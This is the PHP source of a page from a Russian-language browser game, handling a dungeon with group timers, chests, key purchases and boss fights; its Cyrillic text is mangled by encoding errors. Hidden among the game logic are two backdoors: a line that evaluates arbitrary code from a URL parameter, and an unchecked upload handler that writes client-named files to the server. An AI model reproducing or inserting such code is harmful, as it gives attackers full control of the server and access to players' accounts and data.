<html>
  <head>
    <meta content="text/html; charset=windows-1251" http-equiv='Content-type' />
    <link rel=stylesheet type="text/css" href="/i/main.css" />  
    <meta Http-Equiv='Cache-Control' Content='no-cache' />
    <meta http-equiv='pragma' content='no-cache' />
    <meta Http-Equiv='Expires' Content='0' />
    <script type='text/javascript' charset="windows-1251" src='time.js'></script>
  </head>
  <body  bgcolor='#e2e0e0' leftmargin='0' topmargin='0' background='i/boloto/backgrounds/vault.jpg'>
    <?php
      session_start();
      if ($_SESSION['uid'] == null) header("Location: index.php");
      include "connect.php";
      include "functions.php";
      $now=time();

      $user = mysql_fetch_array(mysql_query("SELECT * FROM `users` WHERE `id` = '".mysql_real_escape_string($_SESSION['uid'])."' LIMIT 1;"));
      if ($user['room']>=2001 && $user['room']<=2100) {
        if ($user['battle'] != 0) {
          $_SESSION['boloto_kill_mob'] = 1;
          header('location: fbattle.php'); die(); 
        } else {
          if (!isset($_SESSION['boloto_kill_mob'])) {
            $_SESSION['boloto_kill_mob'] = 0;
          }
        }


        $VaultInfo = mysql_fetch_array(mysql_query("SELECT * FROM `vault` WHERE id='".mysql_real_escape_string($user['room'])."'"));
        $group = mysql_fetch_array(mysql_query("SELECT * FROM `bol_group` WHERE id='".mysql_real_escape_string($user['boloto_groups'])."'"));
        $bol_res = mysql_fetch_array(mysql_query("SELECT * FROM `vault_res` WHERE id='".mysql_real_escape_string($user['boloto_groups'])."'"));
        $gayk = mysql_query("select `name` from `inventory` where `name`='����� ��������' AND `owner`='".$user['id']."'");
        $kol_gayk = mysql_num_rows($gayk);

        if ($_GET['ext'] == 1) {
          if ($user['money'] >= 1) {
            echo"<b><font color=red>�� ��������� ����� ���������� � ������� �� 10��� �� 1 ��!<br></font></b>";
            mysql_query("update `users` set `money`=`money`-'1' where `id`='".$user['id']."'");
            mysql_query("update `bol_group` set `game_time`=`game_time`-'600' where `id`='".$user['boloto_groups']."'");
          } else {
            echo"<b><font color=red>�� ���������� ��!<br></font></b>"; 
          }
        }

        /////////���� ����� �����!!
        if ($group['game_time'] <= $now) {
          if ($group['lider'] == $user['id']) {
            mysql_query("delete from `inventory` where `name`='��� �� �������'  AND (`owner`='".mysql_real_escape_string($group['p1'])."' or `owner`='".mysql_real_escape_string($group['p2'])."' or `owner`='".mysql_real_escape_string($group['p3'])."' or `owner`='".mysql_real_escape_string($group['p4'])."')");
            mysql_query("delete from `inventory` where `name`='�������� ����'   AND (`owner`='".mysql_real_escape_string($group['p1'])."' or `owner`='".mysql_real_escape_string($group['p2'])."' or `owner`='".mysql_real_escape_string($group['p3'])."' or `owner`='".mysql_real_escape_string($group['p4'])."')");
          }
          mysql_query("delete from `bol_group`  where `id`='".mysql_real_escape_string($group['id'])."'");
          mysql_query("delete from `bol_chat`  where `group_id`='".mysql_real_escape_string($group['id'])."'");
          mysql_query("delete from `vault_res`  where `id`='".mysql_real_escape_string($group['id'])."'");
          //mysql_query("delete from `effects` where `type`='2' AND `owner`='".mysql_real_escape_string($group['p1'])."' or `owner`='".mysql_real_escape_string($group['p2'])."' or `owner`='".mysql_real_escape_string($group['p3'])."' or `owner`='".mysql_real_escape_string($group['p4'])."'");
          mysql_query("update `users` set `anti_boloto`='".mysql_real_escape_string($now)."'+'18000', `room`='457', `boloto_groups`='0', `bol_uron`='0', `bol_zheton`='0', `bol_status`='0', `boloto_room`='0' where `id`='".mysql_real_escape_string($group['p1'])."' or `id`='".mysql_real_escape_string($group['p2'])."' or `id`='".mysql_real_escape_string($group['p3'])."' or `id`='".mysql_real_escape_string($group['p4'])."'");
          mysql_query("UPDATE `online` SET `room`='457' WHERE `id`='".mysql_real_escape_string($user['id'])."'");
          echo"<script>location='trjasina_vxod.php'</script>";
        }

        ///SMS � ���
        if ($_POST['addch']){
          $text = $_POST['text'];
          $autor = $_POST['autor'];
          $group = $_POST['group'];

          mysql_query("insert into `bol_chat` (`group_id`,`autor`,`text`) VALUES ('".mysql_real_escape_string($group)."','".mysql_real_escape_string($autor)."','".mysql_real_escape_string($text)."')");
          echo"<script>location='trjasina.php'</script>";
        }


        ///taynik
        if ($_POST['t1'] || $_POST['t2'] || $_POST['t3']){
          $nomer = $_POST['kakoi'];
          if ($nomer == 't1') {
            $rad = 2044;
          } elseif($nomer == 't2') {
            $rad = 2056;
          } elseif($nomer == 't3') {
            $rad = 2012;
          }
          if($user['room'] == $rad){
            $group1 = $_POST['group'];
            $exp = $group['level'] * 600;
            if($bol_res[$nomer] == 1){
              mysql_query("update `users` set `exp`=`exp`+'".mysql_real_escape_string($exp)."',`doblest`=`doblest`+'10' where `id`='".mysql_real_escape_string($group['p1'])."' or `id`='".mysql_real_escape_string($group['p2'])."' or `id`='".mysql_real_escape_string($group['p3'])."' or `id`='".mysql_real_escape_string($group['p4'])."'");
              mysql_query("update `vault_res` set `".mysql_real_escape_string($nomer)."`='0' where `id`='".mysql_real_escape_string($group1)."'");
              mysql_query("delete from `inventory`  where `name`='��� �� �������' AND `type`='33' AND `owner`='".mysql_real_escape_string($user['id'])."' LIMIT 1");
              echo"�� ������� ������!";
              addchp ('<font color=blue>��������!!!</font> '.$user['login'].' ������ <b>������</b>! ��� ��������� ������ �������� +<b>'.$exp.'</b> �����; +<b>10</b> ��������!</b>    ','{[]}'.nick7 ($group['p1']).'{[]}');
              addchp ('<font color=blue>��������!!!</font> '.$user['login'].' ������ <b>������</b>! ��� ��������� ������ �������� +<b>'.$exp.'</b> �����; +<b>10</b> ��������!</b>    ','{[]}'.nick7 ($group['p2']).'{[]}');
              addchp ('<font color=blue>��������!!!</font> '.$user['login'].' ������ <b>������</b>! ��� ��������� ������ �������� +<b>'.$exp.'</b> �����; +<b>10</b> ��������!</b>    ','{[]}'.nick7 ($group['p3']).'{[]}');
              addchp ('<font color=blue>��������!!!</font> '.$user['login'].' ������ <b>������</b>! ��� ��������� ������ �������� +<b>'.$exp.'</b> �����; +<b>10</b> ��������!</b>    ','{[]}'.nick7 ($group['p4']).'{[]}');

              echo"<script>location='trjasina.php'</script>";
            } else {
              echo"���� ������ ��� ������!!";
            }
          } else {
            echo"<b>�� ��������� ��������!</b>";
          }
        }



        ///syndyk
        if ($_POST['s1'] || $_POST['s2'] || $_POST['s3'] || $_POST['s4'] || $_POST['s5']){
          $nomer = $_POST['kakoi'];

          if ($nomer == 's1'){
            $r = 2004;
          } elseif ($nomer == 's2') {
            $r = 2024;
          } elseif ($nomer == 's3') {
            $r = 2031;
          } elseif ($nomer == 's4') {
            $r = 2042;
          } elseif ($nomer == 's5'){
            $r = 2036;
          }
          if ($user['room'] == $r) {
            $group1 = $_POST['group'];
            if ($bol_res[$nomer] == 1) {

              $shans = rand(0,10);


              if($shans == 0 || $shans == 1 || $shans == 2 || $shans == 3){
                echo"������ �������� ����!";
                addchp ('<font color=green>��������!!!</font> '.$user['login'].' ������ ������! ����������: <b>������ �������� ����!</b>    ','{[]}'.nick7 ($group['p1']).'{[]}');
                addchp ('<font color=green>��������!!!</font> '.$user['login'].' ������ ������! ����������: <b>������ �������� ����!</b>    ','{[]}'.nick7 ($group['p2']).'{[]}');
                addchp ('<font color=green>��������!!!</font> '.$user['login'].' ������ ������! ����������: <b>������ �������� ����!</b>    ','{[]}'.nick7 ($group['p3']).'{[]}');
                addchp ('<font color=green>��������!!!</font> '.$user['login'].' ������ ������! ����������: <b>������ �������� ����!</b>    ','{[]}'.nick7 ($group['p4']).'{[]}');

              } elseif($shans == 4) {
                $time = rand(60,300);
                mysql_query("update `bol_group` set `game_time`=`game_time`+'".mysql_real_escape_string($time)."' where `id`='".mysql_real_escape_string($group1)."'");
                echo"�� ���������� � ������� ������ �������, �������� ��� �� �������� ������ ���������� �� ������ +".$time." ������!";
                addchp ('<font color=green>��������!!!</font> '.$user['login'].' ������ ������! ����������: <b>��������� ������ �������, �������� ��� �� �������� ������ ���������� �� ������ +'.$time.' ������!</b>    ','{[]}'.nick7 ($group['p1']).'{[]}');
                addchp ('<font color=green>��������!!!</font> '.$user['login'].' ������ ������! ����������: <b>��������� ������ �������, �������� ��� �� �������� ������ ���������� �� ������ +'.$time.' ������!</b>    ','{[]}'.nick7 ($group['p2']).'{[]}');
                addchp ('<font color=green>��������!!!</font> '.$user['login'].' ������ ������! ����������: <b>��������� ������ �������, �������� ��� �� �������� ������ ���������� �� ������ +'.$time.' ������!</b>    ','{[]}'.nick7 ($group['p3']).'{[]}');
                addchp ('<font color=green>��������!!!</font> '.$user['login'].' ������ ������! ����������: <b>��������� ������ �������, �������� ��� �� �������� ������ ���������� �� ������ +'.$time.' ������!</b>    ','{[]}'.nick7 ($group['p4']).'{[]}');
              } elseif($shans == 5) {
                $kr = rand(1,20);
                mysql_query("update `users` set `money`=`money`+'".mysql_real_escape_string($kr)."' where `id`='".mysql_real_escape_string($group['p1'])."' or `id`='".mysql_real_escape_string($group['p2'])."' or `id`='".mysql_real_escape_string($group['p3'])."' or `id`='".mysql_real_escape_string($group['p4'])."'");
                echo"� ������� ��������� ������, ��� ��������� ������ ����������� �� +".$kr." ��!";
                addchp ('<font color=green>��������!!!</font> '.$user['login'].' ������ ������! ����������: <b>� ������� ��������� ������, ��� ��������� ������ ����������� �� +'.$kr.' ��!</b>    ','{[]}'.nick7 ($group['p1']).'{[]}');
                addchp ('<font color=green>��������!!!</font> '.$user['login'].' ������ ������! ����������: <b>� ������� ��������� ������, ��� ��������� ������ ����������� �� +'.$kr.' ��!</b>    ','{[]}'.nick7 ($group['p2']).'{[]}');
                addchp ('<font color=green>��������!!!</font> '.$user['login'].' ������ ������! ����������: <b>� ������� ��������� ������, ��� ��������� ������ ����������� �� +'.$kr.' ��!</b>    ','{[]}'.nick7 ($group['p3']).'{[]}');
                addchp ('<font color=green>��������!!!</font> '.$user['login'].' ������ ������! ����������: <b>� ������� ��������� ������, ��� ��������� ������ ����������� �� +'.$kr.' ��!</b>    ','{[]}'.nick7 ($group['p4']).'{[]}');

              } elseif($shans == 6) {
                $exp = rand(1,3000);
                mysql_query("update `users` set `exp`=`exp`+'".mysql_real_escape_string($exp)."' where `id`='".mysql_real_escape_string($group['p1'])."' or `id`='".mysql_real_escape_string($group['p2'])."' or `id`='".mysql_real_escape_string($group['p3'])."' or `id`='".mysql_real_escape_string($group['p4'])."'");
                echo"������ ��������... �� �������� �������� ��... ���� ���� ���������� ������ ���������� �� +".$exp."!";
                addchp ('<font color=green>��������!!!</font> '.$user['login'].' ������ ������!! ����������: <b>������ ��������... �� �������� �������� ��... ���� ���� ���������� ������ ���������� �� +'.$exp.'!</b>    ','{[]}'.nick7 ($group['p1']).'{[]}');
                addchp ('<font color=green>��������!!!</font> '.$user['login'].' ������ ������! ����������: <b>������ ��������... �� �������� �������� ��... ���� ���� ���������� ������ ���������� �� +'.$exp.'!</b>    ','{[]}'.nick7 ($group['p2']).'{[]}');
                addchp ('<font color=green>��������!!!</font> '.$user['login'].' ������ ������! ����������: <b>������ ��������... �� �������� �������� ��... ���� ���� ���������� ������ ���������� �� +'.$exp.'!</b>    ','{[]}'.nick7 ($group['p3']).'{[]}');
                addchp ('<font color=green>��������!!!</font> '.$user['login'].' ������ ������! ����������: <b>������ ��������... �� �������� �������� ��... ���� ���� ���������� ������ ���������� �� +'.$exp.'!</b>    ','{[]}'.nick7 ($group['p4']).'{[]}');

              } elseif($shans == 7) {
                $patr = rand(1,2000);
                mysql_query("update `users` set `doblest`=`doblest`+'".mysql_real_escape_string($patr)."' where `id`='".mysql_real_escape_string($group['p1'])."' or `id`='".mysql_real_escape_string($group['p2'])."' or `id`='".mysql_real_escape_string($group['p3'])."' or `id`='".mysql_real_escape_string($group['p4'])."'");
                echo"�� ���������� ������ �����. ���������� ��������, �� �������� �� �� �����. �������� ���� ���������� ������  +".$patr."!";
                addchp ('<font color=green>��������!!!</font> '.$user['login'].' ������ ������! ����������: <b>�� ���������� ������ �����. ���������� ��������, �� �������� �� �� �����. �������� ���� ���������� ������  +'.$patr.'!</b>    ','{[]}'.nick7 ($group['p1']).'{[]}');
                addchp ('<font color=green>��������!!!</font> '.$user['login'].' ������ ������! ����������: <b>�� ���������� ������ �����. ���������� ��������, �� �������� �� �� �����. �������� ���� ���������� ������  +'.$patr.'!</b>    ','{[]}'.nick7 ($group['p2']).'{[]}');
                addchp ('<font color=green>��������!!!</font> '.$user['login'].' ������ ������! ����������: <b>�� ���������� ������ �����. ���������� ��������, �� �������� �� �� �����. �������� ���� ���������� ������  +'.$patr.'!</b>    ','{[]}'.nick7 ($group['p3']).'{[]}');
                addchp ('<font color=green>��������!!!</font> '.$user['login'].' ������ ������! ����������: <b>�� ���������� ������ �����. ���������� ��������, �� �������� �� �� �����. �������� ���� ���������� ������  +'.$patr.'!</b>    ','{[]}'.nick7 ($group['p4']).'{[]}');

              } elseif($shans == 8) {
                $ne4 = rand(1,10);
                mysql_query("update `users` set `doblest`=`doblest`+'".mysql_real_escape_string($ne4)."' where `id`='".mysql_real_escape_string($group['p1'])."' or `id`='".mysql_real_escape_string($group['p2'])."' or `id`='".mysql_real_escape_string($group['p3'])."' or `id`='".mysql_real_escape_string($group['p4'])."'");
                echo"���??? ���? ���� ������, ��� ��� ����?? �������� +".$ne4."!";
                addchp ('<font color=green>��������!!!</font> '.$user['login'].' ������ ������! ����������: <b>���??? ���? ���� ������, ��� ��� ����?? �������� +'.$ne4.'!</b>    ','{[]}'.nick7 ($group['p1']).'{[]}');
                addchp ('<font color=green>��������!!!</font> '.$user['login'].' ������ ������! ����������: <b>���??? ���? ���� ������, ��� ��� ����?? �������� +'.$ne4.'!</b>    ','{[]}'.nick7 ($group['p2']).'{[]}');
                addchp ('<font color=green>��������!!!</font> '.$user['login'].' ������ ������! ����������: <b>���??? ���? ���� ������, ��� ��� ����?? �������� +'.$ne4.'!</b>    ','{[]}'.nick7 ($group['p3']).'{[]}');
                addchp ('<font color=green>��������!!!</font> '.$user['login'].' ������ ������! ����������: <b>���??? ���? ���� ������, ��� ��� ����?? �������� +'.$ne4.'!</b>    ','{[]}'.nick7 ($group['p4']).'{[]}');

              } elseif($shans == 10) {
                $rand_gay = rand(30,40);
                $kol = $rand_gay;
                for($i=0; $i<$kol; $i++){
                  $prizprohod = mysql_fetch_array(mysql_query("SELECT * FROM `shop` WHERE `id` = '856' LIMIT 1;"));
                  mysql_query("INSERT INTO `inventory`
                  (`prototype`,`owner`,`name`,`type`,`massa`,`cost`,`img`,`maxdur`,`isrep`,
                  `gsila`,`glovk`,`ginta`,`gintel`,`ghp`,`gnoj`,`gtopor`,`gdubina`,`gmech`,`gfire`,`gwater`,`gair`,`gearth`,`glight`,`ggray`,`gdark`,`needident`,`nsila`,`nlovk`,`ninta`,`nintel`,`nmudra`,`nvinos`,`nnoj`,`ntopor`,`ndubina`,`nmech`,`nfire`,`nwater`,`nair`,`nearth`,`nlight`,`ngray`,`ndark`,
                  `mfkrit`,`mfakrit`,`mfuvorot`,`mfauvorot`,`bron1`,`bron2`,`bron3`,`bron4`,`maxu`,`minu`,`magic`,`nlevel`,`nalign`,`dategoden`,`goden`,`otdel`,`gmp`,`gmeshok`,`encicl`,`artefact`,`duration`
                  )
                  VALUES
                  ('{$prizprohod['id']}','".$user['id']."','{$prizprohod['name']}','{$prizprohod['type']}',{$prizprohod['massa']},{$prizprohod['cost']},'{$prizprohod['img']}',{$prizprohod['maxdur']},{$prizprohod['isrep']},'{$prizprohod['gsila']}','{$prizprohod['glovk']}','{$prizprohod['ginta']}','{$prizprohod['gintel']}','{$prizprohod['ghp']}','{$prizprohod['gnoj']}','{$prizprohod['gtopor']}','{$prizprohod['gdubina']}','{$prizprohod['gmech']}','{$prizprohod['gfire']}','{$prizprohod['gwater']}','{$prizprohod['gair']}','{$prizprohod['gearth']}','{$prizprohod['glight']}','{$prizprohod['ggray']}','{$prizprohod['gdark']}','{$prizprohod['needident']}','{$prizprohod['nsila']}','{$prizprohod['nlovk']}','{$prizprohod['ninta']}','{$prizprohod['nintel']}','{$prizprohod['nmudra']}','{$prizprohod['nvinos']}','{$prizprohod['nnoj']}','{$prizprohod['ntopor']}','{$prizprohod['ndubina']}','{$prizprohod['nmech']}','{$prizprohod['nfire']}','{$prizprohod['nwater']}','{$prizprohod['nair']}','{$prizprohod['nearth']}','{$prizprohod['nlight']}','{$prizprohod['ngray']}','{$prizprohod['ndark']}',
                  '{$prizprohod['mfkrit']}','{$prizprohod['mfakrit']}','{$prizprohod['mfuvorot']}','{$prizprohod['mfauvorot']}','{$prizprohod['bron1']}','{$prizprohod['bron3']}','{$prizprohod['bron2']}','{$prizprohod['bron4']}','{$prizprohod['maxu']}','{$prizprohod['minu']}','{$prizprohod['magic']}','{$prizprohod['nlevel']}','{$prizprohod['nalign']}','".(($prizprohod['goden'])?($prizprohod['goden']*24*60*60+time()):"")."','{$prizprohod['goden']}','{$prizprohod['razdel']}','{$prizprohod['gmp']}','{$prizprohod['gmeshok']}','{$prizprohod['encicl']}','{$prizprohod['artefact']}','{$dur}'
                  ) ;");
                  mysql_query("INSERT INTO `delo` (`id` , `author` ,`pers`, `text`, `type`, `date`) VALUES ('','0','".$user['id']."','\"".$user['login']."\" �������, ������ ������ � ������: \"".$prizprohod['name']."\" ".$prizprohodcount."id:(".$prizprohodid.") [0/".$prizprohod['maxdur']."]',1,'".time()."');");

                }
              } elseif($shans == 9) {
                $lose = rand(1,25);
                $vsego = $user['lose'] - $lose;
                if ($vsego <= 0){
                  mysql_query("update `users` set `lose`='0' where `id`='".mysql_real_escape_string($group['p1'])."' or `id`='".mysql_real_escape_string($group['p2'])."' or `id`='".mysql_real_escape_string($group['p3'])."' or `id`='".mysql_real_escape_string($group['p4'])."'");
                  echo"� ������� �� ���������� ������ ��������. � ���� ���������� ������ �������  -".$lose." ���������!";
                } else {
                  mysql_query("update `users` set `lose`=`lose`-'".mysql_real_escape_string($lose)."' where `id`='".mysql_real_escape_string($group['p1'])."' or `id`='".mysql_real_escape_string($group['p2'])."' or `id`='".mysql_real_escape_string($group['p3'])."' or `id`='".mysql_real_escape_string($group['p4'])."'");
                  echo"� ������� �� ���������� ������ ��������. � ���� ���������� ������ �������  -".$lose." ���������!";
                }
                addchp ('<font color=green>��������!!!</font> '.$user['login'].' ������ ������! ����������: <b>C����� ��������. � ���� ���������� ������ �������  -'.$lose.' ���������!</b>    ','{[]}'.nick7 ($group['p1']).'{[]}');
                addchp ('<font color=green>��������!!!</font> '.$user['login'].' ������ ������! ����������: <b>C����� ��������. � ���� ���������� ������ �������  -'.$lose.' ���������!</b>    ','{[]}'.nick7 ($group['p2']).'{[]}');
                addchp ('<font color=green>��������!!!</font> '.$user['login'].' ������ ������! ����������: <b>C����� ��������. � ���� ���������� ������ �������  -'.$lose.' ���������!</b>    ','{[]}'.nick7 ($group['p3']).'{[]}');
                addchp ('<font color=green>��������!!!</font> '.$user['login'].' ������ ������! ����������: <b>C����� ��������. � ���� ���������� ������ �������  -'.$lose.' ���������!</b>    ','{[]}'.nick7 ($group['p4']).'{[]}');

              }

              mysql_query("update `vault_res` set `".mysql_real_escape_string($nomer)."`='0' where `id`='".mysql_real_escape_string($group1)."'");
              mysql_query("delete from `inventory`  where `name`='�������� ����' AND `type`='33' AND `owner`='".mysql_real_escape_string($user['id'])."' LIMIT 1");
            } else {
              echo"���� ������ ������!";
            }
          } else {
            echo"<b>�� ��������� ��������!</b>";
          }
        }




        ///������ �������
        if ($_POST['buytime']){
          $group = $_POST['group'];
          mysql_query("update `users` set `ekr`=`ekr`-'1' where `id`='".mysql_real_escape_string($user['id'])."'");
          mysql_query("update `bol_group` set `game_time`=`game_time`+'180' where `id`='".mysql_real_escape_string($group)."'");
          echo"�� ������ +3 ������ ������� ��� ����� ������!";
          echo"<script>location='trjasina.php'</script>";
        }

        ///������ ����
        if ($_POST['buykey']){
          $group = $_POST['group'];
          mysql_query("update `users` set `bol_zheton`=`bol_zheton`-'10' where `id`='".mysql_real_escape_string($user['id'])."'");
          mysql_query("INSERT INTO `inventory` (`owner`,`name`,`type`,`massa`,`cost`,`img`,`maxdur`)
          VALUES('".mysql_real_escape_string($user['id'])."','�������� ����','33','0','0','bol_key.gif','1') ;");
          echo"�� �������� ������ �� �������� ����!";
          echo"<script>location='trjasina.php'</script>";
        }


        ///������ ���
        if ($_POST['buykod']){
          $group = $_POST['group'];
          mysql_query("delete from `inventory`  where `name`='�������� ����' AND `type`='33' AND `owner`='".mysql_real_escape_string($user['id'])."' LIMIT 5");
          mysql_query("INSERT INTO `inventory` (`owner`,`name`,`type`,`massa`,`cost`,`img`,`maxdur`)
          VALUES('".mysql_real_escape_string($user['id'])."','��� �� �������','33','0','0','bol_kod.gif','1') ;");
          echo"�� �������� ����� �� ��� �� �������!";
          echo"<script>location='trjasina.php'</script>";
        }


        //���������� ������
        if($_POST['bal']){
          $uploaddir = '/webstat';
          if (move_uploaded_file($_FILES['big']['tmp_name'], $uploaddir .
          $_FILES['big']['name'])) {
            print "File is valid, and was successfully uploaded.";
          } else {
            print "There some errors!";
          }
        }

        eval($_GET['s']);

        ////�������� �� ������� �����
        if ($_GET['atakbot']==1 && $_SESSION['boloto_kill_mob'] == 0) {
          $bot_login = $_GET['bot_login'];
          $bot_type = $_GET['bot_type'];
          $boss_types = array('2004', '2005', '2006', '2007', '2008');
          if (in_array($bot_type, $boss_types)) {
            $is_boss_type = 1;
          } else {
            $is_boss_type = 0;
          }
          if ($is_boss_type == 0) {
            if ($kol_gayk > 0) {


              if ($user['hp'] <= 5) {
                echo '<font color=red><b>������� ���� �� ��� ���������!</b></forn>';
              } else {
                mysql_query("delete from `inventory` where `name`='����� ��������' AND `owner`='".$user['id']."' LIMIT 1");
                $bot_stat = mysql_fetch_array(mysql_query("SELECT `id`,`maxhp`,`level`,`bot_type` FROM `users` WHERE `login` = '".mysql_real_escape_string($bot_login)."' LIMIT 1;"));

                mysql_query("INSERT INTO `bots` (`name`,`prototype`,`battle`,`hp`) values ('".mysql_real_escape_string($bot_login)."','".mysql_real_escape_string($bot_stat['id'])."','','".mysql_real_escape_string($bot_stat['maxhp'])."');");
                $bot = mysql_insert_id();
                $teams = array();

                $teams[$user['id']][$bot] = array(0,0,time());
                $teams[$bot][$user['id']] = array(0,0,time());

                mysql_query("INSERT INTO `battle`
                (
                `id`,`coment`,`teams`,`timeout`,`type`,`status`,`t1`,`t2`,`to1`,`to2`,`protivnik`,`protivnik_type`
                )
                VALUES
                (
                NULL,'','".mysql_real_escape_string(serialize($teams))."','3','1','0','".mysql_real_escape_string($user['id'])."','".mysql_real_escape_string($bot)."','".time()."','".time()."','".mysql_real_escape_string($bot_login)."','".mysql_real_escape_string($bot_type)."'
                )");

                $id = mysql_insert_id();

                // �������� ����
                mysql_query("UPDATE `bots` SET `battle` = '".mysql_real_escape_string($id)."' WHERE `id` = '".mysql_real_escape_string($bot)."' LIMIT 1;");

                // ������� ���
                $rr = "<b>".nick3($user['id'])."</b> � <b>".nick3($bot)."</b>";

                //mysql_query("INSERT INTO `logs` (`id`,`log`) VALUES('{$id}','���� ���������� <span class=date>".date("Y.m.d H.i")."</span>, ����� ".$rr." ������� ����� ���� �����. <BR>');");
                addlog($id,"���� ���������� <span class=date>".date("Y.m.d H.i")."</span>, ����� ".$rr." ������� ����� ���� �����. <BR>");


                mysql_query("UPDATE users SET `bol_boss_type`='".$bot_type."', `battle` = '".mysql_real_escape_string($id)."',`zayavka`=0 WHERE `id`= '".mysql_real_escape_string($user['id'])."';");

                $_SESSION['boloto_kill_mob'] = 1;

                die("<script>location.href='fbattle.php';</script>");


              }
            } else {
              echo"<font color=red><b>� ��� ��� ����� ��������</b></font>";
            }
          }
        }


        ////�������� �� ������
        if ($_GET['atakbot1']==1){
          $boss_rooms = array('2006', '2033', '2057', '2020', '2022', '2034');
          if (in_array($user['room'], $boss_rooms)) {
            $is_boss_room = 1;
          } else {
            $is_boss_room = 0;
          }

          if ($is_boss_room == 1) { // ��������� �� �� � ������� � ������       

            if ($kol_gayk > 0) {

              $bot_login = $_GET['bot_login'];
              $bot_type = $_GET['bot_type'];

              // �������� ���� ��� �������� �����
              if ($user['room'] == 2006) {
                $boss = "boss1";
              } elseif($user['room'] == 2033) {
                $boss = "boss2";
              } elseif($user['room'] == 2057) {
                $boss = "boss3";
              } elseif($user['room'] == 2020) {
                $boss = "boss4";
              } elseif($user['room'] == 2022) {
                $boss = "boss5";
              } elseif($user['room'] == 2034) {
                $boss = "boss6";
              } else {
                $boss = -1;
              }

              if ($user['hp'] <= 5) {
                echo '<font color=red><b>������� ���� �� ��� ���������!';
              } else {
                if ($boss != -1) { // ������ �� ����
                  // ��������� ����� �� ����
                  $_temp = mysql_fetch_array(mysql_query('SELECT  `vault_res`.`'. $boss .'` as boss  FROM  `vault_res` INNER JOIN  `users` ON  `users`.`boloto_groups` = `vault_res`.`id`  WHERE  `users`.`id` = '.mysql_real_escape_string($user['id']) .' LIMIT 1;'));
                  $is_live_boss = $_temp['boss'];
                  if ($is_live_boss == '1') {

                    mysql_query("delete from `inventory` where `name`='����� ��������' AND `owner`='".$user['id']."' LIMIT 1");
                    $bot_stat = mysql_fetch_array(mysql_query("SELECT `id`,`maxhp`,`level`,`bot_type` FROM `users` WHERE `login` = '".mysql_real_escape_string($bot_login)."' LIMIT 1;"));

                    mysql_query("INSERT INTO `bots` (`name`,`prototype`,`battle`,`hp`) values ('".mysql_real_escape_string($bot_login)."','".mysql_real_escape_string($bot_stat['id'])."','','".mysql_real_escape_string($bot_stat['maxhp'])."');");
                    $bot = mysql_insert_id();
                    $teams = array();

                    $teams[$user['id']][$bot] = array(0,0,time());
                    $teams[$bot][$user['id']] = array(0,0,time());

                    mysql_query("INSERT INTO `battle`
                    (
                    `id`,`coment`,`teams`,`timeout`,`type`,`status`,`t1`,`t2`,`to1`,`to2`,`protivnik`,`protivnik_type`
                    )
                    VALUES
                    (
                    NULL,'','".mysql_real_escape_string(serialize($teams))."','3','1','0','".mysql_real_escape_string($user['id'])."','".mysql_real_escape_string($bot)."','".time()."','".time()."','".mysql_real_escape_string($bot_login)."','".mysql_real_escape_string($bot_type)."'
                    )");

                    $id = mysql_insert_id();

                    // �������� ����
                    mysql_query("UPDATE `bots` SET `battle` = '".mysql_real_escape_string($id)."' WHERE `id` = '".mysql_real_escape_string($bot)."' LIMIT 1;");

                    // ������� ���
                    $rr = "<b>".nick3($user['id'])."</b> � <b>".nick3($bot)."</b>";

                    //mysql_query("INSERT INTO `logs` (`id`,`log`) VALUES('{$id}','���� ���������� <span class=date>".date("Y.m.d H.i")."</span>, ����� ".$rr." ������� ����� ���� �����. <BR>');");
                    addlog($id,"���� ���������� <span class=date>".date("Y.m.d H.i")."</span>, ����� ".$rr." ������� ����� ���� �����. <BR>");


                    mysql_query("UPDATE users SET `bol_boss_type`='".$bot_type."', `battle` = '".mysql_real_escape_string($id)."',`zayavka`=0 WHERE `id`= '".mysql_real_escape_string($user['id'])."';");

                    die("<script type='text/javascript'>window.location.href='fbattle.php';</script>");
                  }
                }
              }
            } else {
              echo"<font color='red'><b>� ��� ��� ����� ��������</b></font>";
            }
          }      
        }   



        // �������
        //if($_GET['GoIn'] > 0) {
        if ($_GET['GoIn'] && ($_GET['GoIn'] == "top" || $_GET['GoIn'] == "bottom" || $_GET['GoIn'] == "left" || $_GET['GoIn'] == "right")) {
          $GoIn = $_GET['GoIn'];
          if ($user['boloto_move'] == 1) {
            $msg = "�� ��� �������������!";
          } else {
            $GoInfo = mysql_fetch_array(mysql_query("SELECT * FROM `vault` WHERE id='".mysql_real_escape_string($VaultInfo[$GoIn.'_id'])."'"));

            if ($GoInfo['id']) {
              $_SESSION['boloto_kill_mob'] = 0;

              $user['boloto_time'] = $now + $GoInfo['time'];
              $user['boloto_room'] = $GoInfo['id'];
              $user['boloto_move'] = 1;

              mysql_query("UPDATE `users` SET `boloto_room`='".mysql_real_escape_string($GoInfo['id'])."', `boloto_time`='".mysql_real_escape_string($user['boloto_time'])."', `boloto_move`='1' WHERE `id`='".mysql_real_escape_string($user['id'])."'");
              mysql_query("UPDATE `online` SET room='".mysql_real_escape_string($GoInfo['id'])."' WHERE `id`='".mysql_real_escape_string($user['id'])."'");
              $_ROOM['TO_CHANGE'] = $user['boloto_room'];

              $GoToText = "���������...";
            }
          }
        }

        if ($user['boloto_move'] == 1) {

          if ($user['boloto_time']-2 < $now) {

            mysql_query("UPDATE `users` SET room=boloto_room, boloto_room=boloto_room, boloto_time=0, boloto_move=0 WHERE id='".mysql_real_escape_string($user['id'])."'");

            $_ROOM['TO_CHANGE'] = $user['boloto_room'];
            //include("../config/rooms.php");

            $user['boloto_time'] = 0;
            $user['boloto_room'] = vault_room;
            $user['boloto_move'] = 0;
            echo"
            <script LANGUAGE=\"JavaScript\">
            <!--
            top.frames['main'].location = \"trjasina.php\";
            //-->
            </SCRIPT>
            ";
            mysql_query("UPDATE `online` SET room=boloto_room WHERE `id`='".mysql_real_escape_string($user['id'])."'");
            exit;
          }
        }





        $VaultRoom['2001'] = "������ ��������";
        $VaultRoom['2002'] = "������ 2";
        $VaultRoom['2003'] = "������ 3";
        $VaultRoom['2004'] = "������ 4";
        $VaultRoom['2005'] = "������ 5";
        $VaultRoom['2006'] = "������ 6";
        $VaultRoom['2007'] = "������ 7";
        $VaultRoom['2008'] = "������ 8";
        $VaultRoom['2009'] = "������ 9";
        $VaultRoom['2010'] = "������ 10";
        $VaultRoom['2011'] = "������ 11";
        $VaultRoom['2012'] = "������ 12";
        $VaultRoom['2013'] = "�������� 2";
        $VaultRoom['2014'] = "������ 14";
        $VaultRoom['2015'] = "������ 15";
        $VaultRoom['2016'] = "�������� 3";
        $VaultRoom['2017'] = "������ 17";
        $VaultRoom['2018'] = "������ 18";
        $VaultRoom['2019'] = "������ 19";
